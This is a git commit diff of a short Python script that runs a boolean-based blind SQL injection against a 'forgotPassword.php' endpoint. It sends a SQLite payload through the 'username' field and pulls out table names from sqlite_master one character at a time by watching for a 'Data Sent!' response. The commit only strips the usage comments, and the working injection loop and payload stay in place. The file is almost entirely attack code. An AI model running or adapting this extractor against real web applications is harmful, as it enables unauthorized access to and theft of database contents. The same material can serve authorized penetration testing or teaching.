34230d096bd13ebb58f8c949c35ebf43495775d1
aykutcanustun <46404406+aykutcanustun@users.noreply.github.com>
2020-06-19 23:07:53 +0300

    main script

--- main.py
+++ main.py
@@ -1,8 +1,8 @@
 import requests
 
 s = requests.Session()
-query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--" # Set query with above.
-url = "https://vulnable.webpage.com/forgotPassword.php" #Set URL
+query = "' or UNICODE(SUBSTR((SELECT name FROM sqlite_master WHERE type='table'),{},1)){} {}--"
+url = "https://vulnable.webpage.com/forgotPassword.php"
 charSeaching = 1
 interval = 0
 finished = False
@@ -10,15 +10,15 @@ finished = False
 while not finished:
     for i in 44, 56, 68, 80, 92, 104, 116, 128:
         req = s.post(
-            url, data={"username": query.format(charSeaching, "<", str(i))}) # Replace "username" with the parameter in your request. 
-        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
+            url, data={"username": query.format(charSeaching, "<", str(i))})
+        if "Data Sent!" in str(req.text):
             interval = i
             break
 
     for i in range(interval-12, interval):
         req = s.post(
-            url, data={"username": query.format(charSeaching, "=", str(i))}) # Replace "username" with the parameter in your request. 
-        if "Data Sent!" in str(req.text): # Replace "Data Sent!" with your requests reply.
+            url, data={"username": query.format(charSeaching, "=", str(i))})
+        if "Data Sent!" in str(req.text):
             charSeaching += 1
             finished = False
             print(chr(i), end="")
